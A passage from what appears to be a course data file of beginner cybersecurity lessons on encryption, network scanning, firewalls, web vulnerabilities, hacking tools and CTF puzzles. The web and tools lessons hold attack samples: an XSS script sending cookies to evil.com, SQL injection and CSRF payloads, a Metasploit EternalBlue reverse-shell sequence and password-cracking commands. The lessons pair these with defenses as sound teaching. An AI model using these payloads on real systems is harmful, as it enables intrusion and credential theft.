You → "x8k2m9p4..." → Wi-Fi → Website
                         ↑
                    Hacker sees:
                  "x8k2m9p4..." 🤷
\`\`\`

### Man-in-the-Middle (MITM) Attack

\`\`\`
Normal:
You ←──────────→ Google

MITM Attack:
You ←────→ Hacker ←────→ Google
           (reads everything!)
\`\`\`

HTTPS prevents this because the hacker can't forge Google's certificate!

### Check a Site's Certificate

Click the 🔒 in your browser:
1. See who issued the certificate
2. Check if it's valid
3. View the encryption details

\`\`\`bash
# Check certificate from terminal
openssl s_client -connect google.com:443 -brief

# See certificate details
echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -text
\`\`\`

### End-to-End Encryption (E2EE)

Apps like Signal and WhatsApp use E2EE:

\`\`\`
Regular encryption:
You → [Encrypted] → Server [DECRYPTED] → [Encrypted] → Friend
                     Server can read! 😰

End-to-End encryption:
You → [Encrypted] → Server [still encrypted] → Friend
                     Server can't read! ✅
\`\`\`

Only you and the recipient have the keys!

### VPNs — Your Encrypted Tunnel

\`\`\`
Without VPN:
You → ISP (sees everything) → Internet
      Your ISP knows every site you visit!

With VPN:
You → [Encrypted Tunnel] → VPN Server → Internet
      ISP sees only encrypted data!
      But... VPN server sees your traffic
\`\`\`

<warning>
⚠️ VPNs move trust, not remove it. You're trusting the VPN provider instead of your ISP. Choose carefully!
</warning>

<tip>
💡 Free VPNs often sell your data. If you're not paying, YOU are the product!
</tip>

### Wi-Fi Security Standards

\`\`\`
WEP (1999)  → BROKEN! Can be cracked in minutes
WPA (2003)  → BROKEN! Known vulnerabilities
WPA2 (2004) → Good, but KRACK attack found in 2017
WPA3 (2018) → Current best standard ✓

ALWAYS use WPA2 or WPA3 for your home Wi-Fi!
\`\`\`

### Public Wi-Fi Dangers

\`\`\`
RISKS of public Wi-Fi (coffee shops, airports):
├── Evil Twin Attack (fake hotspot with same name)
├── Packet Sniffing (reading unencrypted traffic)
├── Man-in-the-Middle (intercepting connections)
└── Session Hijacking (stealing login cookies)

PROTECTION:
├── Use HTTPS sites only
├── Use a VPN
├── Don't access banking/sensitive accounts
├── Turn off auto-connect to Wi-Fi networks
└── Forget the network when done
\`\`\`

### Tor — Anonymous Browsing

\`\`\`
How Tor works (The Onion Router):

Your traffic is encrypted in 3 layers:
You → Guard Node → Middle Node → Exit Node → Website

Each node only knows the previous and next hop:
Guard:  Knows YOU, but not the website
Middle: Knows nothing useful
Exit:   Knows the website, but not YOU

Like wrapping a letter in 3 envelopes:
Each relay opens one envelope, sees the next address,
but never the original sender AND the content together.
\`\`\`

<tip>
💡 Tor provides anonymity but is SLOW. Use it when privacy matters most, not for everyday browsing.
</tip>

Now you understand how encryption protects your data online! 🛡️
          `
        }
      ]
    },
    {
      id: 5,
      title: "Network Security",
      description: "Defend and analyze networks",
      lessons: [
        {
          id: "5-1",
          title: "Network Scanning & Reconnaissance",
          duration: "14 min",
          content: `
## Seeing What's on Your Network 🔍

Before you can defend a network, you need to know what's on it!

### What is Reconnaissance?

The first step in both hacking AND defending:
1. **What devices are connected?**
2. **What ports are open?**
3. **What services are running?**

### Nmap — The Network Scanner

**Nmap** is the most famous security scanning tool:

\`\`\`bash
# Scan your local network (find all devices)
nmap -sn 192.168.1.0/24

# Output:
# Host is up: 192.168.1.1    (Router)
# Host is up: 192.168.1.100  (Your PC)
# Host is up: 192.168.1.101  (Phone)
# Host is up: 192.168.1.105  (Smart TV)
\`\`\`

### Port Scanning

\`\`\`bash
# Scan a specific device for open ports
nmap 192.168.1.1

# Output:
# PORT    STATE  SERVICE
# 22/tcp  open   ssh
# 80/tcp  open   http
# 443/tcp open   https
# 8080/tcp open  http-proxy
\`\`\`

### Understanding Port States

| State | Meaning |
|-------|---------|
| **open** | Service is listening (accessible!) |
| **closed** | Port exists but no service |
| **filtered** | Firewall is blocking the scan |

### Wireshark — See ALL Network Traffic

**Wireshark** captures and displays every packet on your network:

\`\`\`
No. | Time    | Source          | Dest            | Protocol | Info
1   | 0.000   | 192.168.1.100  | 142.250.80.46  | TCP      | SYN
2   | 0.012   | 142.250.80.46  | 192.168.1.100  | TCP      | SYN-ACK
3   | 0.013   | 192.168.1.100  | 142.250.80.46  | TCP      | ACK
4   | 0.014   | 192.168.1.100  | 142.250.80.46  | TLS      | Client Hello
\`\`\`

### What You Can See in Wireshark

\`\`\`
✅ DNS queries (what sites devices visit)
✅ Unencrypted HTTP traffic
✅ Connection patterns
✅ Suspicious traffic
❌ HTTPS content (encrypted!)
❌ VPN traffic content
\`\`\`

### Netstat — Check Your Own Connections

\`\`\`bash
# See all active connections on your computer
netstat -an

# Windows: see which programs have connections
netstat -ab

# Mac/Linux: with process IDs
netstat -tulpn
# or
ss -tulpn
\`\`\`

<tip>
💡 If you see connections to IPs you don't recognize, it could be malware phoning home!
</tip>

### DNS Lookup Tools

\`\`\`bash
# Find IP of a domain
nslookup example.com

# Detailed DNS info
dig example.com

# Reverse lookup (IP → domain)
nslookup 8.8.8.8
# Result: dns.google
\`\`\`

### Traceroute — Follow the Path

See every router between you and a destination:

\`\`\`bash
# Mac/Linux
traceroute google.com

# Windows
tracert google.com

# Output:
# 1  192.168.1.1      (your router)
# 2  10.0.0.1         (ISP)
# 3  72.14.215.85     (backbone)
# 4  142.250.80.46    (Google!)
\`\`\`

### Practice: Scan Your Home Network

\`\`\`bash
# 1. Find your IP
ifconfig  # or ipconfig on Windows

# 2. Scan your network
nmap -sn 192.168.1.0/24

# 3. Count devices - do you recognize them all?
# Unknown devices = potential security issue!
\`\`\`

<warning>
⚠️ Only scan networks you OWN or have permission to scan. Scanning others' networks can be illegal!
</warning>

Knowing your network is the first step to defending it! 🔍
          `
        },
        {
          id: "5-2",
          title: "Firewalls & Defense",
          duration: "10 min",
          content: `
## Building Your Fortress 🏰

Now that you can see what's on a network, let's protect it!

### What is a Firewall?

A firewall is a gatekeeper that decides what traffic gets in and out:

\`\`\`
Internet → [FIREWALL] → Your Network
                ↓
        Rules decide:
        ✅ Allow web traffic (80, 443)
        ✅ Allow email (25, 587)
        ❌ Block everything else
\`\`\`

### Firewall Rules

Rules follow this format:
\`\`\`
ACTION  DIRECTION  PROTOCOL  PORT  SOURCE/DEST

ALLOW   INBOUND    TCP       443   Any → Server
ALLOW   OUTBOUND   TCP       80    Server → Any  
DENY    INBOUND    TCP       22    Any → Server
DENY    INBOUND    ALL       ALL   Any → Any (default)
\`\`\`

### Linux Firewall (iptables/ufw)

\`\`\`bash
# UFW (Uncomplicated Firewall) - easy mode!

# Enable firewall
sudo ufw enable

# Allow web server
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Allow SSH from specific IP only
sudo ufw allow from 192.168.1.100 to any port 22

# Block everything else (default)
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Check rules
sudo ufw status
\`\`\`

### Windows Firewall

\`\`\`
Settings → Windows Security → Firewall
- Domain networks: ON
- Private networks: ON
- Public networks: ON (most restrictive!)
\`\`\`

### Types of Firewalls

| Type | What It Does |
|------|-------------|
| **Packet Filter** | Checks each packet against rules |
| **Stateful** | Tracks connection states |
| **Application** | Understands HTTP, DNS, etc. |
| **Next-Gen (NGFW)** | Deep inspection + AI |

### Intrusion Detection (IDS) vs Prevention (IPS)

\`\`\`
IDS: "Hey, I saw something suspicious!" (alerts only)
IPS: "Suspicious traffic BLOCKED!" (takes action)
\`\`\`

### Network Segmentation

Don't put everything on one network!

\`\`\`
BAD (flat network):
[Server] - [PC] - [Smart TV] - [IoT Camera]
  ↑ If one gets hacked, hacker has access to ALL

GOOD (segmented):
[Server VLAN] | [Office VLAN] | [IoT VLAN]
  ↑ Hacked IoT camera can't reach the server!
\`\`\`

### Wi-Fi Security

| Protocol | Security | Status |
|----------|----------|--------|
| WEP | ❌ Broken | Never use |
| WPA | ⚠️ Weak | Avoid |
| WPA2 | ✅ Good | Current standard |
| WPA3 | ✅✅ Best | Use if available |

\`\`\`
Your Wi-Fi Checklist:
☐ WPA2 or WPA3 enabled
☐ Strong password (not "password123")
☐ Default router admin password changed
☐ WPS disabled (it's hackable!)
☐ Guest network for visitors
☐ Router firmware up to date
\`\`\`

<tip>
💡 Your router's admin page is usually at 192.168.1.1 or 192.168.0.1 — log in and check your security settings!
</tip>

### Defense in Depth

Don't rely on just one defense:

\`\`\`
Layer 1: Firewall (network perimeter)
Layer 2: Antivirus (endpoint protection)
Layer 3: Updates/Patches (close vulnerabilities)
Layer 4: Strong passwords + 2FA (access control)
Layer 5: Training (human awareness)
Layer 6: Backups (recovery plan)
\`\`\`

Multiple layers = much harder to hack! 🏰

### Honeypots — Trap the Attackers!

\`\`\`
A honeypot is a FAKE system designed to:
1. Detect attackers (early warning)
2. Distract from real systems
3. Study attacker techniques
4. Waste attacker time

Types:
├── Low-interaction: Simulates services (easy to set up)
├── Medium-interaction: Emulates OS/services 
└── High-interaction: Real systems (most realistic)

Example tools:
├── Cowrie (SSH/Telnet honeypot)
├── Dionaea (malware collection)
└── HoneyDB (web-based honeypot)
\`\`\`

\`\`\`bash
# Simple SSH honeypot with Cowrie
# Install Cowrie
git clone https://github.com/cowrie/cowrie.git
cd cowrie
pip install -r requirements.txt

# When hackers try to SSH in, Cowrie:
# - Records all commands they type
# - Captures any malware they upload
# - Logs their IP and techniques
# - Gives them a fake filesystem to explore

# All while your REAL server stays safe!
\`\`\`

### Log Analysis — Finding Intrusions

\`\`\`bash
# Real security work: analyzing log files

# Find failed SSH login attempts
grep "Failed password" /var/log/auth.log | tail -20

# Count failed logins per IP (find brute-force attacks)
grep "Failed password" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head

# Output:
# 847 192.168.1.55    ← This IP tried 847 times! Block it!
#  23 10.0.0.42
#   3 192.168.1.100

# Find successful logins (verify they're legitimate)
grep "Accepted" /var/log/auth.log

# Web server: find 404 errors (directory enumeration)
grep "404" /var/log/apache2/access.log | \
  awk '{print $7}' | sort | uniq -c | sort -rn | head

# Output:
# 156 /admin          ← Someone looking for admin pages
#  89 /wp-login.php   ← WordPress attack
#  45 /.env           ← Trying to steal config files
\`\`\`

<tip>
💡 Security Information and Event Management (SIEM) tools like Splunk, ELK Stack, and Wazuh automate log analysis at enterprise scale. They're essential for Security Operations Centers (SOCs).
</tip>

### Zero Trust Security Model

\`\`\`
OLD MODEL (Castle and Moat):
  "Trust everything inside the network"
  Problem: Once inside, attackers move freely

NEW MODEL (Zero Trust):
  "Never trust, always verify"
  
  Principles:
  ├── Verify every user, every time
  ├── Verify every device, every time
  ├── Limit access to minimum needed
  ├── Monitor everything continuously
  └── Assume breach has already happened

  Implementation:
  ├── Multi-factor authentication everywhere
  ├── Micro-segmentation of networks
  ├── Continuous monitoring and logging
  ├── Least-privilege access policies
  └── Encrypt all traffic (even internal!)
\`\`\`

Multiple layers = much harder to hack! 🏰
          `
        }
      ]
    },
    {
      id: 6,
      title: "Web Security",
      description: "How websites get hacked",
      lessons: [
        {
          id: "6-1",
          title: "Common Web Vulnerabilities",
          duration: "14 min",
          content: `
## How Websites Get Hacked 🌐

Websites are one of the biggest attack targets. Let's learn how they break!

### SQL Injection (SQLi)

The #1 web vulnerability for decades!

Normal login:
\`\`\`sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
\`\`\`

Hacker enters this as username:
\`\`\`
' OR '1'='1' --
\`\`\`

The query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
\`\`\`

\`'1'='1'\` is always true → Returns ALL users → Hacker is logged in! 😱

### SQL Injection - Data Theft

\`\`\`sql
-- Hacker enters in search box:
' UNION SELECT username, password FROM users --

-- Returns all usernames and passwords!
\`\`\`

### Defense Against SQLi

\`\`\`python
# BAD - Vulnerable to SQL injection!
query = f"SELECT * FROM users WHERE name = '{user_input}'"

# GOOD - Parameterized query (safe!)
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, (user_input,))
\`\`\`

<warning>
⚠️ NEVER put user input directly into SQL queries! Always use parameterized queries.
</warning>

### Cross-Site Scripting (XSS)

Injecting JavaScript into a website:

\`\`\`html
<!-- Hacker posts this as a comment: -->
<script>
  document.location = 'https://evil.com/steal?cookie=' 
    + document.cookie;
</script>

<!-- When other users view the comment, 
     their cookies get stolen! -->
\`\`\`

### Types of XSS

| Type | How It Works |
|------|-------------|
| **Stored XSS** | Malicious code saved in database (comments, profiles) |
| **Reflected XSS** | Code in URL, reflected back by server |
| **DOM XSS** | Manipulates page JavaScript directly |

### Defense Against XSS

\`\`\`python
# Escape HTML special characters
import html
safe_input = html.escape(user_input)
# <script> becomes &lt;script&gt; (won't execute!)
\`\`\`

\`\`\`
Content-Security-Policy: script-src 'self'
↑ Only allow scripts from your own domain!
\`\`\`

### Cross-Site Request Forgery (CSRF)

Trick logged-in users into performing actions:

\`\`\`html
<!-- On evil website: -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- Your browser sends the request WITH your 
     bank session cookie! -->
\`\`\`

Defense: **CSRF tokens** — random values that attackers can't guess.

### Insecure Direct Object References (IDOR)

\`\`\`
Your profile: https://site.com/user/profile?id=123
Change to:    https://site.com/user/profile?id=124
→ See someone else's profile! 😱
\`\`\`

Defense: Always check authorization on the server!

### The OWASP Top 10

The most critical web security risks:

1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQLi, XSS)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Authentication Failures
8. Data Integrity Failures
9. Security Logging Failures
10. Server-Side Request Forgery

<tip>
💡 The OWASP Top 10 is updated regularly and is the gold standard for web security awareness!
</tip>

### Practice: Try Hacking (Legally!)

Safe practice environments:
- **DVWA** (Damn Vulnerable Web App)
- **HackTheBox** (online challenges)
- **TryHackMe** (guided learning)
- **PortSwigger Web Security Academy** (free!)

These are LEGAL practice environments designed to be hacked! 🎯

### Secure Coding Principles

\`\`\`python
# PRINCIPLE 1: Never trust user input!
# Validate, sanitize, escape ALL input

# BAD:
user_input = request.args.get('name')
return f"Hello, {user_input}"  # XSS vulnerable!

# GOOD:
from markupsafe import escape
user_input = request.args.get('name')
return f"Hello, {escape(user_input)}"  # Safe!


# PRINCIPLE 2: Least privilege
# Give minimum permissions needed

# BAD: Running web server as root
# GOOD: Running as www-data user with limited access


# PRINCIPLE 3: Defense in depth
# Don't rely on just one security measure

# Layer 1: Input validation (client-side)
# Layer 2: Input validation (server-side)  
# Layer 3: Parameterized queries (database)
# Layer 4: Output encoding (display)
# Layer 5: Content Security Policy (browser)


# PRINCIPLE 4: Fail securely
# When something goes wrong, don't expose details

# BAD:
try:
    user = database.get_user(id)
except Exception as e:
    return f"Error: {e}"  # Exposes database details!

# GOOD:
try:
    user = database.get_user(id)
except Exception as e:
    log.error(f"Database error: {e}")  # Log internally
    return "An error occurred. Please try again."  # Generic message
\`\`\`

### HTTP Security Headers

\`\`\`
Essential security headers for your web server:

Content-Security-Policy: default-src 'self'
  → Prevents XSS by restricting script sources

X-Content-Type-Options: nosniff
  → Prevents MIME type sniffing attacks

X-Frame-Options: DENY
  → Prevents clickjacking (embedding in iframes)

Strict-Transport-Security: max-age=31536000
  → Forces HTTPS for one year

X-XSS-Protection: 1; mode=block
  → Browser's built-in XSS filter

Referrer-Policy: strict-origin-when-cross-origin
  → Controls what URL info is sent to other sites
\`\`\`

\`\`\`python
# Adding security headers in Flask/Python
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000'
    return response
\`\`\`

### File Upload Vulnerabilities

\`\`\`
ATTACK: Uploading a PHP shell disguised as an image

1. Hacker creates evil.php.jpg
2. Website only checks file extension (.jpg = allowed!)
3. Server executes the PHP code
4. Hacker has remote code execution! 😱

DEFENSES:
✅ Check MIME type (not just extension)
✅ Rename uploaded files
✅ Store outside web root
✅ Limit file types and sizes
✅ Scan for malware
✅ Don't execute uploaded files
\`\`\`

<warning>
⚠️ File upload is one of the most dangerous web features. If not properly secured, it can lead to complete server compromise!
</warning>
          `
        },
        {
          id: "6-2",
          title: "Securing Your Digital Life",
          duration: "10 min",
          content: `
## Your Personal Security Checklist ✅

Let's apply everything you've learned to protect YOUR digital life!

### Browser Security

\`\`\`
✅ Use HTTPS Everywhere (or browser's built-in)
✅ Block third-party cookies
✅ Use ad blocker (uBlock Origin)
✅ Don't save passwords in browser
   (use a password manager instead!)
✅ Keep browser updated
✅ Review extensions (remove unused ones)
\`\`\`

### Phone Security

\`\`\`
✅ Enable screen lock (PIN, fingerprint, face)
✅ Keep OS and apps updated
✅ Only install apps from official stores
✅ Review app permissions
   (Does a flashlight need your contacts? NO!)
✅ Enable "Find My Device"
✅ Encrypt your phone (usually on by default)
\`\`\`

### Social Media Security

\`\`\`
✅ Make profiles private
✅ Don't share:
   - Full birthday
   - Home address
   - School/work location in real-time
   - Vacation plans ("We're away for 2 weeks!")
✅ Review tagged photos
✅ Enable login notifications
✅ Check connected apps regularly
\`\`\`

### Email Security

\`\`\`
✅ Use unique password + 2FA
✅ Don't click links in suspicious emails
✅ Check sender address carefully
✅ Don't open unexpected attachments
✅ Use separate emails:
   - Personal email
   - Shopping/accounts email
   - Throwaway for signups
\`\`\`

### Wi-Fi Security

\`\`\`
✅ Never use public Wi-Fi for banking
✅ Use VPN on public networks
✅ Forget networks when done
✅ Don't auto-connect to open networks
✅ Use your phone hotspot instead
\`\`\`

<warning>
⚠️ Public Wi-Fi is NEVER safe! Anyone on the same network can potentially see your traffic.
</warning>

### Backup Strategy: 3-2-1 Rule

\`\`\`
3 copies of your data
2 different types of storage
1 offsite copy

Example:
1. Your computer (original)
2. External hard drive (local backup)
3. Cloud storage (offsite backup)
\`\`\`

### Software Updates

\`\`\`
Updates often fix security vulnerabilities:

"Critical security patch available"
→ Install it NOW, not later!

Auto-updates: ENABLE THEM
- Operating system
- Browser
- Phone apps
- Router firmware
\`\`\`

### If You Get Hacked

\`\`\`
1. Change passwords IMMEDIATELY
   (start with email!)
2. Enable 2FA on everything
3. Check for unauthorized access
4. Scan for malware
5. Notify affected services
6. Monitor financial accounts
7. Learn from it!
\`\`\`

<tip>
💡 Check if your email has been in a breach: haveibeenpwned.com — It's free and run by a security researcher!
</tip>

### Your Security Score

Rate yourself:
\`\`\`
[ ] Unique passwords for every account
[ ] Password manager in use
[ ] 2FA on email and banking
[ ] Phone has screen lock
[ ] Browser is up to date
[ ] Don't click suspicious links
[ ] Backups are current
[ ] Wi-Fi uses WPA2/WPA3
[ ] Social media is private

7-9: 🟢 Great security!
4-6: 🟡 Getting there
0-3: 🔴 You're at risk!
\`\`\`

### Ransomware — The Modern Plague

\`\`\`
How ransomware works:
1. You click a malicious link/attachment
2. Malware encrypts ALL your files
3. You see a ransom note:
   "Pay $5,000 in Bitcoin or lose your files forever!"
4. You either pay (no guarantee they'll decrypt)
   or restore from backup

PREVENTION:
├── Don't open suspicious attachments
├── Keep software updated (patches vulnerabilities)
├── Use antivirus with real-time protection
├── MAINTAIN BACKUPS (the ultimate defense!)
└── Use email filtering for malicious attachments

FAMOUS RANSOMWARE:
├── WannaCry (2017) — Hit 200K+ computers worldwide
├── NotPetya (2017) — $10B in damages globally
├── Colonial Pipeline (2021) — Shut down US fuel supply
└── REvil (2021) — $70M ransom demand from Kaseya
\`\`\`

<warning>
⚠️ Paying the ransom funds criminal operations and doesn't guarantee file recovery. The FBI recommends NOT paying. Always maintain backups instead!
</warning>

### Privacy Tools

\`\`\`
BROWSER:
├── Firefox (privacy-focused settings)
├── Brave (built-in ad/tracker blocking)
└── Tor Browser (maximum anonymity)

SEARCH ENGINE:
├── DuckDuckGo (doesn't track searches)
└── Startpage (Google results, no tracking)

EMAIL:
├── ProtonMail (end-to-end encrypted)
└── Tutanota (encrypted, open-source)

MESSAGING:
├── Signal (gold standard for private messaging)
└── Wire (encrypted team communication)

DNS:
├── 1.1.1.1 (Cloudflare — fast, private)
└── 9.9.9.9 (Quad9 — blocks malicious domains)
\`\`\`

### Incident Response Plan

\`\`\`
IF YOU SUSPECT A BREACH:

STEP 1: CONTAIN
  ├── Disconnect from network
  ├── Don't turn off the computer (preserve evidence!)
  └── Change passwords from a different device

STEP 2: IDENTIFY
  ├── What was accessed?
  ├── How did they get in?
  └── When did it start?

STEP 3: ERADICATE
  ├── Remove malware
  ├── Close the vulnerability
  └── Reset all affected credentials

STEP 4: RECOVER
  ├── Restore from clean backups
  ├── Verify everything works
  └── Monitor for re-compromise

STEP 5: LEARN
  ├── Document what happened
  ├── Update security measures
  └── Train to prevent recurrence
\`\`\`

Security is a journey, not a destination! 🛡️
          `
        }
      ]
    },
    {
      id: 7,
      title: "Ethical Hacking Tools",
      description: "Tools of the trade",
      lessons: [
        {
          id: "7-1",
          title: "Kali Linux & Hacking Tools",
          duration: "12 min",
          content: `
## The Hacker's Toolkit 🧰

Professional security researchers use specialized tools. Let's explore them!

### Kali Linux

The #1 operating system for ethical hacking:

\`\`\`
What: Linux distro pre-loaded with 600+ security tools
Where: kali.org (free!)
How: Run in VirtualBox or as USB boot
\`\`\`

### Setting Up Kali (In VirtualBox)

\`\`\`bash
# 1. Download VirtualBox (free)
#    virtualbox.org

# 2. Download Kali Linux VM image
#    kali.org/get-kali/

# 3. Import into VirtualBox
#    File → Import Appliance → Select .ova file

# 4. Start it up!
#    Default login: kali / kali
\`\`\`

### Essential Tools Overview

| Tool | Category | What It Does |
|------|----------|-------------|
| **Nmap** | Scanning | Network/port scanning |
| **Wireshark** | Analysis | Packet capture & analysis |
| **Burp Suite** | Web | Web app testing |
| **Metasploit** | Exploitation | Vulnerability exploitation |
| **John the Ripper** | Passwords | Password cracking |
| **Hashcat** | Passwords | GPU-accelerated cracking |
| **Aircrack-ng** | Wireless | Wi-Fi security testing |
| **Hydra** | Passwords | Online brute force |
| **SQLMap** | Web | Automated SQL injection |
| **Nikto** | Web | Web server scanner |

### Nmap Deep Dive

\`\`\`bash
# Basic scan
nmap target.com

# Scan all ports
nmap -p- target.com

# Detect operating system
nmap -O target.com

# Detect services and versions
nmap -sV target.com

# Aggressive scan (OS + services + scripts)
nmap -A target.com

# Scan for vulnerabilities
nmap --script vuln target.com
\`\`\`

### Burp Suite — Web App Testing

\`\`\`
Your Browser → [Burp Proxy] → Website
                    ↓
        See & modify EVERY request!

1. Intercept login requests
2. Modify parameters
3. Replay requests
4. Find hidden endpoints
\`\`\`

### Metasploit Framework

The exploitation Swiss army knife:

\`\`\`bash
# Start Metasploit
msfconsole

# Search for exploits
search apache
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
exploit
\`\`\`

<warning>
⚠️ ONLY use these tools on systems you have WRITTEN PERMISSION to test! Unauthorized use is a crime.
</warning>

### Password Cracking Tools

\`\`\`bash
# John the Ripper - crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat - GPU-accelerated (much faster!)
hashcat -m 0 -a 0 hashes.txt rockyou.txt
\`\`\`

### Practice Platforms

Safe, legal places to practice:

\`\`\`
🎯 TryHackMe.com     — Guided rooms, beginner-friendly
🎯 HackTheBox.com    — Realistic challenges
🎯 PicoCTF.org       — Student CTF competitions
🎯 OverTheWire.org   — Wargames (start with Bandit)
🎯 DVWA              — Practice web hacking locally
\`\`\`

<tip>
💡 Start with TryHackMe — it has learning paths from absolute beginner to advanced! And it's free.
</tip>

### Career Paths in Cybersecurity

| Role | What They Do | Avg Salary |
|------|-------------|-----------|
| Security Analyst | Monitor & respond to threats | $80K |
| Penetration Tester | Hack companies (legally!) | $100K |
| Security Engineer | Build secure systems | $120K |
| Bug Bounty Hunter | Find bugs for rewards | Varies ($$$) |
| CISO | Lead security strategy | $200K+ |

### Certifications to Consider

\`\`\`
Beginner:
  CompTIA Security+
  CEH (Certified Ethical Hacker)

Intermediate:
  OSCP (Offensive Security Certified Professional)
  CySA+

Advanced:
  CISSP
  OSCE
\`\`\`

### The Penetration Testing Methodology

\`\`\`
A professional penetration test follows these phases:

Phase 1: RECONNAISSANCE
├── Passive (OSINT — no touching the target)
│   ├── Google dorking
│   ├── Social media research
│   ├── WHOIS lookups
│   └── Shodan searches
│
└── Active (touching the target)
    ├── Port scanning (nmap)
    ├── Service enumeration
    └── DNS zone transfers

Phase 2: SCANNING & ENUMERATION
├── Vulnerability scanning (Nessus, OpenVAS)
├── Web directory bruteforcing (gobuster, dirb)
├── Service version detection
└── Banner grabbing

Phase 3: EXPLOITATION
├── Attempt known vulnerabilities
├── Test weak credentials
├── Try SQL injection, XSS, etc.
└── Social engineering (if in scope)

Phase 4: POST-EXPLOITATION
├── Privilege escalation
├── Lateral movement
├── Data access assessment
└── Persistence demonstration

Phase 5: REPORTING
├── Executive summary
├── Technical findings
├── Risk ratings (Critical/High/Medium/Low)
├── Remediation recommendations
└── Proof of concept evidence
\`\`\`

### Linux Command Line Essentials

\`\`\`bash
# Essential Linux commands for cybersecurity:

# File operations
ls -la          # List files (including hidden)
cat file.txt    # Display file contents
grep "password" file.txt  # Search for text
find / -name "*.conf"     # Find config files

# Network commands
ifconfig        # Network interfaces
netstat -tulpn  # Open ports and connections
curl -I site.com  # HTTP headers
wget file.url   # Download files

# Process management
ps aux          # All running processes
kill -9 PID     # Force kill a process
top             # Real-time process monitor

# Permissions
chmod 600 key   # Set file permissions
chown user file # Change ownership
sudo command    # Run as root

# Text processing
cat file | grep "error"  # Filter lines
sort file.txt | uniq     # Remove duplicates
wc -l file.txt           # Count lines
\`\`\`

<tip>
💡 Get comfortable with the Linux terminal — nearly all cybersecurity tools run from the command line. Practice daily!
</tip>

### Bug Bounty Programs

Get PAID to find security vulnerabilities:

\`\`\`
PLATFORM        COMPANIES            TYPICAL BOUNTIES
HackerOne       Many Fortune 500     $100 - $100,000+
Bugcrowd        Major tech companies $50 - $50,000+
Synack          Government, finance  Invite-only
Direct programs Google, Apple, Meta  Up to $1,000,000!

TOP BUG BOUNTY PAYOUTS:
├── Apple: $100,000 for kernel exploits
├── Google: Up to $250,000 for Android exploits
├── Microsoft: Up to $250,000 for Hyper-V
└── Facebook: $30,000+ for account takeover bugs

Getting started:
1. Learn web hacking thoroughly
2. Start on HackerOne (beginner programs)
3. Read disclosed reports (learn from others)
4. Focus on one vulnerability type first
5. Be patient — it takes time!
\`\`\`

You now know the tools of the trade! Use them wisely! 🛡️
          `
        }
      ]
    },
    {
      id: 8,
      title: "Capture The Flag",
      description: "Put your skills to the test",
      lessons: [
        {
          id: "8-1",
          title: "Your First CTF Challenge",
          duration: "15 min",
          content: `
## Capture The Flag! 🏁

**CTF (Capture The Flag)** competitions are how hackers test their skills!

### What is a CTF?

Teams or individuals solve security challenges to find hidden "flags":

\`\`\`
Challenge: "Find the hidden message in this website"
You hack → find → flag{y0u_f0und_th3_s3cr3t}
Submit flag → earn points! 🏆
\`\`\`

### CTF Categories

| Category | What You Do |
|----------|-------------|
| **Web** | Hack websites (XSS, SQLi, etc.) |
| **Crypto** | Break encryption |
| **Forensics** | Analyze files, memory dumps |
| **Reversing** | Reverse engineer programs |
| **Pwn** | Exploit binary programs |
| **OSINT** | Find info from public sources |
| **Misc** | Everything else! |

### Challenge 1: Decode This!

\`\`\`
Find the flag:
ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259
\`\`\`

Hint: It's Base64 encoded!

\`\`\`bash
echo "ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259" | base64 -d
# Output: flag{base64_is_not_encryption}
\`\`\`

<tip>
💡 Base64 is encoding, NOT encryption! Anyone can decode it. It's used for data transport, not security.
</tip>

### Challenge 2: Hidden in Plain Sight

\`\`\`html
<!-- Look at a website's source code -->
<!-- Right-click → View Page Source -->
<!-- Or press Ctrl+U -->

<html>
<head><title>Nothing here...</title></head>
<body>
  <p>This page is empty.</p>
  <!-- flag{always_check_the_source} -->
</body>
</html>
\`\`\`

Developers sometimes leave secrets in HTML comments!

### Challenge 3: HTTP Headers

\`\`\`bash
# Check response headers
curl -I https://challenge.ctf.com

# HTTP/1.1 200 OK
# Content-Type: text/html
# X-Secret-Flag: flag{headers_hide_secrets}
# Server: nginx
\`\`\`

### Challenge 4: robots.txt

\`\`\`bash
# Websites tell search engines what NOT to index
curl https://challenge.ctf.com/robots.txt

# User-agent: *
# Disallow: /secret-admin-panel/
# Disallow: /flag.txt

# Now visit /flag.txt!
curl https://challenge.ctf.com/flag.txt
# flag{robots_txt_is_not_security}
\`\`\`

### Challenge 5: Caesar Cipher Crack

\`\`\`
Encrypted: synt{pnrfne_pvcure_vf_jrnx}
\`\`\`

\`\`\`python
# Try all 26 shifts
def caesar_crack(text):
    for shift in range(26):
        result = ""
        for char in text:
            if char.isalpha():
                base = ord('a') if char.islower() else ord('A')
                result += chr((ord(char) - base + shift) % 26 + base)
            else:
                result += char
        if "flag" in result.lower():
            print(f"Shift {shift}: {result}")

caesar_crack("synt{pnrfne_pvcure_vf_jrnx}")
# Shift 13: flag{caesar_cipher_is_weak}
\`\`\`

This is **ROT13** — a Caesar cipher with shift of 13!

### OSINT Challenge

Find information using only public sources:

\`\`\`
Task: "What is the CEO's email at ExampleCorp?"

Sources to check:
1. Company website (About page)
2. LinkedIn profiles
3. GitHub repositories (check commits!)
4. Google dorking: "ExampleCorp" "CEO" "@"
5. WHOIS records for their domain
6. Cached pages
\`\`\`

### Google Dorking

Advanced Google searches for finding exposed data:

\`\`\`
site:example.com filetype:pdf    → PDFs on a site
intitle:"index of" passwords     → Exposed directories
inurl:admin login                → Admin pages
"password" filetype:log          → Log files with passwords
\`\`\`

<warning>
